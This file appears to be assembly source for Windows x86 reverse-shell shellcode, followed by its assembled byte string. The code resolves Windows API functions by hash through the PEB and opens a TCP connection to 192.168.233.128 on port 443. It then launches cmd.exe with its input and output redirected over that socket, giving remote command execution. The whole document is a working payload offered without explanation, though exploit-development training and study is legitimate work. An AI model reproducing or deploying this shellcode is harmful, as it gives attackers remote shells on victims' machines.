global _start

_start:
    mov ebp, esp                    ; new stack frame
    sub esp, 0x28                   ; space for variables

    .find_kernel32:
        xor ecx, ecx                ; TEB structure
        mov esi, [fs: ecx + 0x30]   ; PEB Address
        mov esi, [esi + 0xc]        ; ntdll!PebLdr
        mov esi, [esi + 0x14]       ; InMemoryOrderModuleList
        mov esi, [esi]              ; ntdll.dll
        lodsd                       ; kernel32.dll
        mov ebx, [eax + 0x10]       ; kernel32 base

        jmp .find_short             ; short jump

    .find_ret:
        pop esi                     ; $esi = return addr
        mov [ebp - 0x8], esi        ; var8 = .find_function
        jmp .symbol_kernel32        ; load function from kernel32

    .find_short:
        call .find_ret              ; relative call

    .find_function:
        pusha                       ; save all registers
        mov eax, [ebx + 0x3c]       ; RVA to PE signature
        mov edi, [ebx + eax + 0x78] ; RVA of Export Table
        add edi, ebx                ; Export Table
        mov ecx, [edi + 0x18]       ; NR of Names
        mov eax, [edi + 0x20]       ; RVA of Name Pointer Table
        add eax, ebx                ; Name Pointer Table
        mov [ebp - 0x4], eax        ; var4 = Name Pointer Table

    .find_loop:
        jecxz .find_end             ; if ecx = 0x0
        dec ecx                     ; counter -= 1
        mov eax, [ebp - 0x4]        ; $eax = Name Pointer Table
        mov esi, [eax + ecx * 4]    ; RVA of symbol name
        add esi, ebx                ; symbol name

        xor eax, eax                ; $eax = 0x0
        cdq                         ; $edx = 0x0

    .compute_hash:
        lodsb                       ; load in al next byte from esi
        test al, al                 ; check null terminator
        jz .compare_hash            ; If ZF == 1
        ror edx, 0x2f               ; rot 47
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

   .compare_hash:
        cmp edx, [esp + 0x24]       ; cmp edx, hash
        jnz .find_loop              ; if zf != 1
        mov edx, [edi + 0x24]       ; RVA of Ordinal Table
        add edx, ebx                ; Ordinal Table
        mov cx, [edx + 2 * ecx]     ; extrapolate ordinal functions
        mov edx, [edi + 0x1c]       ; RVA of Address Table
        add edx, ebx                ; Address Table
        mov eax, [edx + 4 * ecx]    ; RVA of function
        add eax, ebx                ; function
        mov [esp + 0x1c], eax       ; overwrite eax from pushad

    .find_end:
        popa                        ; restore registers
        ret                         ; return

    .symbol_kernel32:
        push 0x8ee05933             ; TerminateProcess() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0xc], eax        ; var12 = ptr to TerminateProcess()

        push 0xa9f72dc9             ; CreateProcessA() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x10], eax       ; var20 = ptr to CreateProcessA()

        push 0x583c436c             ; LoadLibraryA() hash
        call [ebp - 0x8]            ; call .find_function

    .load_ws2_32:
        cdq                         ; $edx = 0x0
        mov dx, 0x6c6c              ; "ll"
        push edx                    ; "ll\x00\x00"
        push 0x642e3233             ; "32.d"
        push 0x5f327377             ; "ws2_"
        push esp                    ; "ws2_32.dll"
        call eax                    ; call LoadLibraryA()

    .symbol_ws2_32:
        mov ebx, eax                ; $ebx = ws2_32 base

        push 0xe0a06fc5             ; WSASocketA() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x14], eax       ; var28 = ptr to WSASocketA()

        push 0xe0966ca8             ; WSAConnect() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x18], eax       ; var32 = ptr to WSAConnect()

        push 0xe17a7010             ; WSAStartup() hash
        call [ebp - 0x8]            ; call .find_function

    .call_wsastartup:
        mov edx, esp                ; $edx = $esp
        xor ecx, ecx                ; $ecx = 0x0
        mov cx, 0x590               ; $ecx = 0x590
        sub edx, ecx                ; sub ecx to avoid overwriting
        push edx                    ; lpWSAData
        xor edx, edx                ; $edx = 0x0
        mov dx, 0x0202              ; $edx = 0x00000202
        push edx                    ; wVersionRequired
        call eax                    ; call WSAStartup()

    .call_wsasocketa:
        cdq                         ; $edx = 0x0
        push edx                    ; dwFlags
        push edx                    ; g
        push edx                    ; lpProtocolInfo
        mov dl, 0x6                 ; IPPROTO_TCP
        push edx                    ; protocol
        mov dl, 0x1                 ; SOCK_STREAM
        push edx                    ; type
        inc edx                     ; AF_INET
        push edx                    ; af
        call [ebp - 0x14]           ; call WSASocketA()

    .call_wsaconnect:
        mov esi, eax                ; socket descriptor
        cdq                         ; $edx = 0x0
        push edx                    ; sin_zero[]
        push edx                    ; sin_zero[]
        push 0x80e9a8c0             ; "192.168.233.128"
        mov dx, 0xbb01              ; 443
        shl edx, 0x10               ; shift eax
        add dx, 0x2                 ; add 0x2
        push edx                    ; sin_port & sin_family
        mov edi, esp                ; $edi = sockaddr_in

        cdq                         ; $edx = 0x0
        push edx                    ; lpGQOS
        push edx                    ; lpSQOS
        push edx                    ; lpCalleeData
        push edx                    ; lpCallerData
        mov dl, 0x10                ; $edx = 0x10
        push edx                    ; namelen
        push edi                    ; name
        push esi                    ; s
        call [ebp - 0x18]           ; call WSAConnect()

    .create_startupinfoa:
        push esi                    ; hStdError
        push esi                    ; hStdOutput
        push esi                    ; hStdInput
        cdq                         ; $edx = 0x0
        push edx                    ; lpReserved2
        push edx                    ; cbReserved2 & wShowWindow
        mov dh, 0x1                 ; $edx = 0x100
        push edx                    ; dwFlags
        cdq                         ; $edx = 0x0
        push edx                    ; dwFillAttribute
        push edx                    ; dwYCountChars
        push edx                    ; dwXCountChars
        push edx                    ; dwYSize
        push edx                    ; dwXSize
        push edx                    ; dwY
        push edx                    ; dwX
        push edx                    ; lpTitle
        push edx                    ; lpDesktop
        push edx                    ; lpReserved
        mov dl, 0x44                ; $edx = 0x44
        push edx                    ; cb
        mov edi, esp                ; $edi = startupinfoa

    .create_string:
        mov eax, 0xff9a879b         ; $edx = 0xff9a879b
        neg eax                     ; $edx = 0x00657865
        push eax                    ; "exe\x00"
        push 0x2e646d63             ; "cmd."
        mov ebx, esp                ; $ebx = "cmd.exe"

    .call_createprocessa:
        mov edx, esp                ; $edx = $esp
        xor ecx, ecx                ; $ecx = 0x0
        mov cx, 0x390               ; $ecx = 0x390
        sub edx, ecx                ; sub cx to avoid overwriting
        push edx                    ; lpProcessInformation
        push edi                    ; lpStartupInfo
        cdq                         ; $edx = 0x0
        push edx                    ; lpCurrentDirectory
        push edx                    ; lpEnvironment
        push edx                    ; dwCreationFlags
        inc edx                     ; $edx = 0x1 (TRUE)
        push edx                    ; bInheritHandles
        dec edx                     ; $edx = 0x0
        push edx                    ; lpThreadAttributes
        push edx                    ; lpProcessAttributes
        push ebx                    ; lpCommandLine
        push edx                    ; lpApplicationName
        call [ebp - 0x10]           ; call CreateProcessA()

    .exit:
        cdq                         ; $edx = 0x0
        push edx                    ; uExitCode
        push 0xffffffff             ; hProcess
        call [ebp - 0xc]            ; call TerminateProcess()

; shellcode = b"\x89\xe5\x83\xec\x28\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x14\x8b\x36\xad\x8b\x58\x10\xeb\x06\x5e\x89\x75\xf8\xeb\x53\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x35\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x2f\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xe0\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x33\x59\xe0\x8e\xff\x55\xf8\x89\x45\xf4\x68\xc9\x2d\xf7\xa9\xff\x55\xf8\x89\x45\xf0\x68\x6c\x43\x3c\x58\xff\x55\xf8\x99\x66\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\xd0\x89\xc3\x68\xc5\x6f\xa0\xe0\xff\x55\xf8\x89\x45\xec\x68\xa8\x6c\x96\xe0\xff\x55\xf8\x89\x45\xe8\x68\x10\x70\x7a\xe1\xff\x55\xf8\x89\xe2\x31\xc9\x66\xb9\x90\x05\x29\xca\x52\x31\xd2\x66\xba\x02\x02\x52\xff\xd0\x99\x52\x52\x52\xb2\x06\x52\xb2\x01\x52\x42\x52\xff\x55\xec\x89\xc6\x99\x52\x52\x68\xc0\xa8\xe9\x80\x66\xba\x01\xbb\xc1\xe2\x10\x66\x83\xc2\x02\x52\x89\xe7\x99\x52\x52\x52\x52\xb2\x10\x52\x57\x56\xff\x55\xe8\x56\x56\x56\x99\x52\x52\xb6\x01\x52\x99\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\xb2\x44\x52\x89\xe7\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x89\xe3\x89\xe2\x31\xc9\x66\xb9\x90\x03\x29\xca\x52\x57\x99\x52\x52\x52\x42\x52\x4a\x52\x52\x53\x52\xff\x55\xf0\x99\x52\x6a\xff\xff\x55\xf4"
